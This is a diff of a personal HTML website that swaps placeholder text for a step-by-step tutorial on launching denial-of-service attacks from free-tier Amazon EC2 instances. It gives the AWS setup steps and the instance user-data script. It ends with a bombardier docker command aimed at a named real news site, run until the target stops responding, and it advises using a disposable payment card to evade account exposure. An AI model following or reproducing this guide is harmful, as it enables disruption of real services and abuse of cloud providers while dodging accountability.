@@ -27,10 +27,10 @@
   </head>
   <body>
     <header>
-      <a href="#h">Zanjus</a></h1>
+      <a href="#home">Zanjus</a></h1>
       <nav>
-        <a href="#s">Github</a>
-        <a href="#c">Contact</a>
+        <a href="#github">Github</a>
+        <a href="#contact">Contact</a>
       </nav>
     </header>
 
@@ -44,7 +44,7 @@
   </tr>
 </tbody></table>
       <p align=center><a href="https://war.ukraine.ua/">🇺🇦#StandWithUkraine🇺🇦</a></p>
-      <section id="s">
+      <section id="github">
         Here is <a
               target="_blank"
               rel="noopener"
@@ -55,20 +55,85 @@
         
       </section>
 
-      <section id="c">
+      <section id="contact">
         Created by <a href="mailto:zlatovserhei@gmail.com">Sergei Z</a>
 
       </section>
       
-      <section id="b1">
-        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi quis sapien felis. Nullam pretium vestibulum accumsan. Vestibulum sit amet facilisis leo. Praesent urna lacus, venenatis eget luctus sed, faucibus quis dolor. Maecenas vehicula dictum sagittis. Maecenas suscipit libero pretium, tristique eros sed, suscipit erat. Cras vel convallis lectus. Sed non ante efficitur libero volutpat sodales. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; <br>
+      <section id="How-to-DDos">
+         Hi all <br>
+    In this tutorial will try to describe how to DDoS russian resources using Amazon servers.<br>
+    Amazon gives 750 hours of EC2 (virtual server) as a Free Tier for a month.<br> 
+    Therefore, a simple calculation: 1 server - 1 month of free t2.micro free service, 2 servers - 15 days, etc.<br> 
+    After using these limits will be drawn in accordance with Amazon <a href="https://aws.amazon.com/ru/ec2/pricing/on-demand/">pricing</a>,<br> 
+    so after the execution of the work do not forget to disable the instances.<br> 
+    And I also recommend you to use a card, which does not have a lot of money, and which you can close afterwards (in case of exposing the account to Amazon).<br>
 
-Fusce felis ipsum, posuere quis nunc in, ultricies gravida sem. Fusce viverra efficitur nisl, in convallis dolor vestibulum vel. Phasellus consequat lacus vitae neque venenatis, a cursus turpis finibus. Donec sit amet maximus massa. Proin eget vehicula tellus. Aliquam faucibus lectus sem, in semper lectus mollis ac. Phasellus auctor aliquet sollicitudin. Donec pellentesque eu mi vitae convallis. <br>
+    <ol>
+        <li>Well, let's start with the fact that you have to create an Amazon account and connect the card, from which $1 will be withdrawn 
+            and you can immediately <a href="https://portal.aws.amazon.com/billing/signup#/start/email">return</a> this dollar back.</li>
+        <li>After you sign up, click on the <a href="https://console.aws.amazon.com/">link</a> and login to your created account.</li>
+        <li>Choose any region you like. I choose any American region.<br>
+            To do this, look in the upper right corner of your browser.</li>
+        <li>4. After selecting a region, go to the <a href="https://console.aws.amazon.com/iamv2/home#/roles">IAM service</a> to create a service role for the instance.</li>
+        <ul>
+            <li>In IAM click <b>Create Role</b> - <b>EC2</b> - <b>Next</b> -</li>
+            <img src="https://telegra.ph/file/9104e194cce5fb229c982.png" width="600" height="200">
+            <li>In <b>Add permissions</b> - in the search line - look for <a href="https://console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM">AmazonEC2RoleforSSM</a> and select it.</li>
+            <img src="https://s.dou.ua/storage-files/remotely-run-commands-ec2-instance-systems-manager-1d.fc64c36ffa3e036f527f_aCb7isE.png" width="600" height="400">
+            <li>Then we name the role as created (as you like), e.g. <b>SSMInstanceRole</b>, and complete the creation of the role by clicking the <b>Create Role</b> button from below.</li>
+          </ul>
+        <li>After creating the role, move to the creation of the instance for the <a href="https://console.aws.amazon.com/ec2/v2/home">link</a> and select <b>Launch Instance.</b></li>
+        <ul>
+            <li>In the search box, look for <b>ubuntu</b> and choose the top <b>Ubuntu Server 20.04 LTS</b> on the list by clicking <b>Select</b></li>
+            <li>In the Choose an Instance Type tab, select <b>t2.micro</b> and click <b>Next.Configure Instance Details</b>.</li>
+            <img src="https://telegra.ph/file/6b8b5a581986fad4dc755.png" width="600" height="400">
+            <li><b>The Number of instances</b> can be used to select the number of instances you want to create. 1, 2, 3, etc. 
+                (don't forget about the number of free one month usage in 750 years). All other parameters are defaulted, 
+                but look for <b>IAM Role</b> and select the previously created role and the next important parameter <b>User Data</b>:</li>
+<pre>
+ <code>
+ #!/bin/bash
 
-Pellentesque lobortis lectus vel sem fermentum, vehicula ornare libero venenatis. Vivamus posuere ut tellus in bibendum. Maecenas eu commodo risus, in maximus lacus. In ac gravida lacus. Nam eget scelerisque libero. Nunc in vehicula mi. Vestibulum quis interdum elit. Morbi lobortis aliquet viverra. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Ut ac augue rhoncus, aliquam neque sed, maximus diam. Donec magna odio, lobortis et mi ut, ornare lobortis ipsum. Nulla rhoncus lacinia diam, quis tempor elit elementum a. <br>
+ mkdir /tmp/ssm
+                        
+ cd /tmp/ssm
+                        
+ wget s3.amazonaws.com/...​md64/amazon-ssm-agent.deb
+                        
+ sudo dpkg -i amazon-ssm-agent.deb
+                        
+ sudo start amazon-ssm-agent
+                        
+ sudo systemctl enable amazon-ssm-agent
+                        
+ sudo snap install docker
+                    </code>
+                  </pre>
+            <li>Next click Review and Launch --- Launch --- Procceed without a key pair --- I acknowledge that without a key pair... --- Launch Instance</li>
+            <img src="https://telegra.ph/file/6ae557ba62bb80d53605c.png" width="600" height="400">
+            <li>Go to the board via <b>View Instance</b>. It is necessary to wait for 2 or 3 seconds, until the instance will be configured.</li>
+          </ul>
+          <li> Once the instance is in Running status, select it by clicking on its ID - click <b>Connect</b> - select <b>Session Manager --- Connect</b></li>
+          <img src="https://telegra.ph/file/db8a6b2949825456ad3a4.png" width="600" height="400">
+          <li>After entering the thermal, enter <b>sudo -s</b>. For example, you can use the <a href="https://github.com/almerico/bombardier">tool</a>. 
+              For this you need to run the command docker run -d -rm alpine/bombardier -c 1000 -d 600000h {URL target} in the thermal.</li> <br>
+              
+      </ol>
+      Example: <br>
+      <pre>
+        <code>
+docker run -d --rm alpine/bombardier -c 1000 -
+d 600000h https://lenta.ru
+                </code>
+            </pre>
+      After the target stops responding through the anonimous browser, you can terminate the instance or go to the next target. 
+      Check if the container is running: docker ps -a command. Stop docker container: docker stop {id container}.
+
+        Source: <a href="https://telegra.ph/YAk-DDoS-ti-z-Free-Tier-z-Amazon-Cloud-03-05?from=tg&utm_source=telegram&utm_medium=social">link</a>.  
       </section>
 
-      <section id="h">
+      <section id="home">
         <h1>Hi! this is a super lightweight website</h1>
 
         <p> To check the site size on Firefox or Chrome, open a new
@@ -93,9 +158,13 @@ Pellentesque lobortis lectus vel sem fermentum, vehicula ornare libero venenatis
               >PageSpeed Insights</a
             >
         <br/>
-       <h1>Blog post 1</h1>
+       <h1>How to DDoS with Free Tier from Amazon Cloud</h1>
         <p> 
-          Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi quis sapien felis. Nullam pretium vestibulum accumsan. Vestibulum sit amet facilisis leo. Praesent urna lacus, venenatis eget luctus sed, faucibus quis dolor. <a href="#b1">Read more</a> </p>
+          In this tutorial will try to describe how to DDoS russian resources using Amazon servers.
+    Amazon gives 750 hours of EC2 (virtual server) as a Free Tier for a month.
+    Therefore, a simple calculation: 1 server - 1 month of free t2.micro free service, 2 servers - 15 days, etc.
+    After using these limits will be drawn in accordance with Amazon <a href="https://aws.amazon.com/ru/ec2/pricing/on-demand/">pricing</a>, 
+    so after the execution of the work do not forget to disable the instances. <a href="#How-to-DDos">Read more</a> </p>
       </section>
       
       
